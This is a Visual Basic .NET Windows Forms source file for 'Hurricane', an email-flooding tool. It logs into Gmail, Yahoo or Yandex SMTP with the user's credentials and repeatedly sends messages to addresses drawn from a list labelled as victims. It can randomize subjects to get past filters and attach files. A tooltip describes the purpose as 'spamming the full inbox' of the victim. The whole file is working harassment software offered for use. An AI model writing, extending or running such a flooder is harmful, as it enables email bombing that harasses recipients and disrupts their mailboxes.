Imports System.Diagnostics
Imports System.Drawing
Imports System.Net.Mail
Imports System.Windows.Forms

Public Class Hurricane

    Dim mouseOffset As Point
    Private Sub Me_MouseDown(ByVal sender As Object, ByVal e As MouseEventArgs) Handles Panel.MouseDown
        mouseOffset = New Point(-e.X, -e.Y)
    End Sub
    Private Sub Me_MouseMove(ByVal sender As Object, ByVal e As MouseEventArgs) Handles Panel.MouseMove
        If e.Button = MouseButtons.Left Then
            Dim mousePos = Control.MousePosition
            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
            Location = mousePos
        End If
    End Sub
    Private Sub Hurricane_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Edge1()
        RandomizeBTN.Text$ = "Randomize" & " [" & RndmSpeed.Value & "MS]"
        FLoodDelay.Text$ = "Sending Delay:" & " [ " & FloodingSpeed.Value & " MS ]"
        SendingDelay.Text$ = "Sending Delay: " & FloodingSpeed.Value
        Dim f As New Hurricane
        f.Animated.AnimationType = Guna.UI.WinForms.GunaAnimateWindow.AnimateWindowType.AW_BLEND
        Animated.Start()
    End Sub

    Private Sub HurricaneBase_Click(sender As Object, e As EventArgs) Handles HurricaneBase.Click

    End Sub




    Public Sub Edge1()
        Dim ellipseRadius As New Drawing2D.GraphicsPath
        ellipseRadius.StartFigure()
        ellipseRadius.AddArc(New Rectangle(0, 0, 20, 20), 180, 90)
        ellipseRadius.AddLine(20, 0, Me.Width - 20, 0)
        ellipseRadius.AddArc(New Rectangle(Me.Width - 20, 0, 20, 20), -90, 90)
        ellipseRadius.AddLine(Me.Width, 20, Me.Width, Me.Height - 20)
        ellipseRadius.AddArc(New Rectangle(Me.Width - 20, Me.Height - 20, 20, 20), 0, 90)
        ellipseRadius.AddLine(Me.Width - 20, Me.Height, 20, Me.Height)
        ellipseRadius.AddArc(New Rectangle(0, Me.Height - 20, 20, 20), 90, 90)
        ellipseRadius.CloseFigure()
        Me.Region = New Region(ellipseRadius)
        Me.Region = New Region(ellipseRadius)
        Me.Region = New Region(ellipseRadius)
    End Sub
    Private Sub MinimizeButton_Click(sender As Object, e As EventArgs) Handles MinimizeButton.Click
        Me.WindowState = FormWindowState.Minimized
    End Sub

    Private Sub ExitButton_Click(sender As Object, e As EventArgs) Handles ExitButton.Click


        If MsgBox("Are you sure you want exit?", vbOKCancel, "Close Hurricane") = vbOK Then
            Try
                Application.Exit()
                End
            Catch
            End Try
        Else

        End If
    End Sub

    Private Sub TextBox2_TextChanged(sender As Object, e As EventArgs) Handles MeMail.TextChanged

    End Sub

    Private Sub RandomizeBTN_Click(sender As Object, e As EventArgs) Handles RandomizeBTN.Click

        If RandomizeBTN.Text$ = "Randomize" & " [" & RndmSpeed.Value & "MS]" Then

            RndmSubject.Start()
            RandomizeBTN.Text$ = "Randomized" & " [" & RndmSpeed.Value & "MS]"
        Else
            RndmSubject.Stop()
            RandomizeBTN.Text$ = "Randomize" & " [" & RndmSpeed.Value & "MS]"
        End If
    End Sub

    Private Sub RandomizeBTN_MouseHover(sender As Object, e As EventArgs) Handles RandomizeBTN.MouseHover
        Dim T As New ToolTip

        T.ToolTipTitle = "Randomize"
        T.UseFading = True
        T.UseAnimation = True
        T.IsBalloon = True
        T.ShowAlways = True
        T.AutoPopDelay = 3000
        T.InitialDelay = 100
        T.ReshowDelay = 500
        T.SetToolTip(RandomizeBTN, "Click Randomize to randomize the Email Subject, which you send to your Victim, it's very good for spamming the full inbox!")
    End Sub

    Private Sub Panel_Paint(sender As Object, e As PaintEventArgs) Handles Panel.Paint

    End Sub

    Private Sub RandomizeSpeedLBL_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub RndmSpeed_Scroll(sender As Object, e As ScrollEventArgs) Handles RndmSpeed.Scroll
        RndmSubject.Interval = RndmSpeed.Value

        RandomizeBTN.Text$ = "Randomize " & "[" & RndmSpeed.Value & "MS]"

    End Sub

    Private Sub RndmSubject_Tick(sender As Object, e As EventArgs) Handles RndmSubject.Tick
        Try
            Dim Random As New Random
            SubjectText.Text$ = "HURRICANE" & Random.Next(1, 999999) & "HURRICANE" & Random.Next(1, 999999) & "HURRICANE"
        Catch
        End Try
    End Sub

    Private Sub VictimGroupBTN_Click(sender As Object, e As EventArgs)
        VictimGroup.Show()

        SMTPGroup.Hide()

    End Sub

    Private Sub SelectSMTP_SelectedIndexChanged(sender As Object, e As EventArgs) Handles SelectSMTP.SelectedIndexChanged
        If SelectSMTP.Text$ = "Google" Then
            SmtpServer.Text$ = "smtp.gmail.com"
            SmptPort.Text$ = "587"
        End If
        If SelectSMTP.Text$ = "Yahoo" Then
            SmtpServer.Text$ = "smtp.mail.yahoo.com"
            SmptPort.Text$ = "465"
        End If
        If SelectSMTP.Text$ = "Yandex" Then
            SmtpServer.Text$ = "smtp.yandex.com"
            SmptPort.Text$ = "465"
        End If


    End Sub

    Private Sub GunaGradientCircleButton2_Click(sender As Object, e As EventArgs)

        SMTPGroup.Show()
        ClientGroup.Hide()
        VictimGroup.Hide()
        Start.Hide()
    End Sub

    Private Sub GunaGradientCircleButton1_Click(sender As Object, e As EventArgs)

        SMTPGroup.Hide()
        ClientGroup.Show()
        VictimGroup.Hide()

        Start.Hide()
    End Sub

    Private Sub GunaGradientCircleButton3_Click(sender As Object, e As EventArgs)

        ClientGroup.Hide()
        VictimGroup.Hide()
        SMTPGroup.Hide()
        Start.Show()
    End Sub

    Private Sub ClientGroup_Enter(sender As Object, e As EventArgs) Handles ClientGroup.Enter

    End Sub

    Private Sub Flooder_Tick(sender As Object, e As EventArgs) Handles Flooder.Tick
        Dim MyMailMessage As New MailMessage()
        Dim SMTP As New SmtpClient(SmtpServer.Text$)
        Try
            MyMailMessage.From = New MailAddress(MeMail.Text$)
            MyMailMessage.To.Add(CurrentVictim.Text$)
            MyMailMessage.Subject = (SubjectText.Text$)
            MyMailMessage.Body = (Message.Text$)
            If HtmlBox.Text = "My email message do not contain HTML." Then
                MyMailMessage.IsBodyHtml = False
            Else
                MyMailMessage.IsBodyHtml = True
            End If

            SMTP.Port = (SmptPort.Text$)
            SMTP.Credentials = New Net.NetworkCredential(MeMail.Text$, MePass.Text$)
            If SwitchSSL.Checked = True Then
                SMTP.EnableSsl = True
                SslLbl1.Text$ = "SSL: On"
            Else
                SMTP.EnableSsl = False
                SslLbl1.Text$ = "SSL: Off"
            End If
            If Not destination.Text = "" Then
                Dim attach As New Attachment(AttachmentsOpen.FileName)
                MyMailMessage.Attachments.Add(attach)

            End If



            SMTP.Send(MyMailMessage)
            ListBox1.Items.Add("Sending a Hurricane to: " & CurrentVictim.Text$ & " with the Subject: " & SubjectText.Text$ & " | Powered by the Hurricane Flooder")
            Count.Text$ = "Sended Mails: " & ListBox1.Items.Count.ToString
        Catch
        End Try
    End Sub





    Private Sub GunaGradientButton1_Click(sender As Object, e As EventArgs) Handles ClientBTN.Click
        SMTPGroup.Hide()
        ClientGroup.Show()
        VictimGroup.Hide()

        Start.Hide()
    End Sub

    Private Sub GunaGradientButton2_Click(sender As Object, e As EventArgs) Handles SMTPBTN.Click
        SMTPGroup.Show()
        ClientGroup.Hide()
        VictimGroup.Hide()
        Start.Hide()
    End Sub

    Private Sub GunaGradientButton3_Click(sender As Object, e As EventArgs) Handles VictimBTN.Click
        VictimGroup.Show()
        ClientGroup.Hide()
        Start.Hide()
        SMTPGroup.Hide()

    End Sub

    Private Sub GunaGradientButton4_Click(sender As Object, e As EventArgs) Handles CpBTN.Click
        ClientGroup.Hide()
        VictimGroup.Hide()
        SMTPGroup.Hide()
        Start.Show()
    End Sub

    Private Sub GunaTrackBar1_Scroll(sender As Object, e As ScrollEventArgs) Handles FloodingSpeed.Scroll
        FLoodDelay.Text = "Sending Delay:" & " [ " & FloodingSpeed.Value & " MS ]"
        SendingDelay.Text = "Sending Delay: " & FloodingSpeed.Value
        Flooder.Interval = FloodingSpeed.Value
    End Sub

    Private Sub Start_Enter(sender As Object, e As EventArgs) Handles Start.Enter

    End Sub

    Private Sub TimerVictim_Tick(sender As Object, e As EventArgs) Handles TimerVictim.Tick
        Try
            Dim r As Random = New Random()
            Dim index As Integer = r.[Next](0, VictimMail.Lines.Length)
            Dim line As String = VictimMail.Lines(index)
            CurrentVictim.Text = line

            If CurrentVictim.Text = "" Then




            End If

        Catch
        End Try
    End Sub

    Private Sub VictimGroup_Enter(sender As Object, e As EventArgs) Handles VictimGroup.Enter

    End Sub
    Private Sub CountMailsSub()
        Dim count As Integer = VictimMail.GetLineFromCharIndex(Integer.MaxValue) + 1
        If VictimMail.Lines.Length = 0 Then count -= 1

        For Each line As String In VictimMail.Lines
            If line = "" Then count -= 1
        Next
        MailsLoadedLbl.Text = "Mails Loaded: " & count
    End Sub

    Private Sub ListBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ListBox1.SelectedIndexChanged

    End Sub

    Private Sub VictimMail_TextChanged(sender As Object, e As EventArgs) Handles VictimMail.TextChanged
        CountMailsSub()
    End Sub

    Private Sub StartBTN_Click(sender As Object, e As EventArgs)

        Flooder.Start()
        Flooder.Enabled = True

    End Sub

    Private Sub SMTPGroup_Enter(sender As Object, e As EventArgs) Handles SMTPGroup.Enter

    End Sub

    Private Sub SwitchSSL_CheckedChanged(sender As Object, e As EventArgs) Handles SwitchSSL.CheckedChanged

    End Sub

    Private Sub GunaCheckBox1_CheckedChanged(sender As Object, e As EventArgs)
        If ShowPW.Checked = True Then
            MePass.PasswordChar = ""
        Else
            MePass.PasswordChar = "*"
        End If
    End Sub

    Private Sub StartButton_Click(sender As Object, e As EventArgs) Handles StartButton.Click
        If StartButton.Text = "Start Flooding" Then
            Flooder.Start()
            TimerVictim.Start()
            StartButton.Text = "Stop Flooding"

        Else
            Flooder.Stop()
            TimerVictim.Stop()
            StartButton.Text = "Start Flooding"
        End If
    End Sub

    Private Sub SmtpServer_TextChanged(sender As Object, e As EventArgs) Handles SmtpServer.TextChanged
        C_erver.Text = "Current SMTP Server: " & SmtpServer.Text
    End Sub

    Private Sub GunaGradientCircleButton1_Click_1(sender As Object, e As EventArgs) Handles DiscordGO.Click
        Process.Start("https://discord.gg/34KcWkT")
    End Sub

    Private Sub CurrentVictim_TextChanged(sender As Object, e As EventArgs) Handles CurrentVictim.TextChanged
        C_victim.Text = "Current Victim: " & CurrentVictim.Text
    End Sub

    Private Sub SelectBTN_Click(sender As Object, e As EventArgs) Handles SelectBTN.Click
        AttachmentsOpen.ShowDialog()
    End Sub

    Private Sub AttachmentsOpen_FileOk(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles AttachmentsOpen.FileOk
        destination.Text$ = AttachmentsOpen.FileName
    End Sub

    Private Sub GunaGradientCircleButton1_Click_2(sender As Object, e As EventArgs) Handles ProcessGithub.Click
        Process.Start("https://github.com/KashedDev")
    End Sub
End Class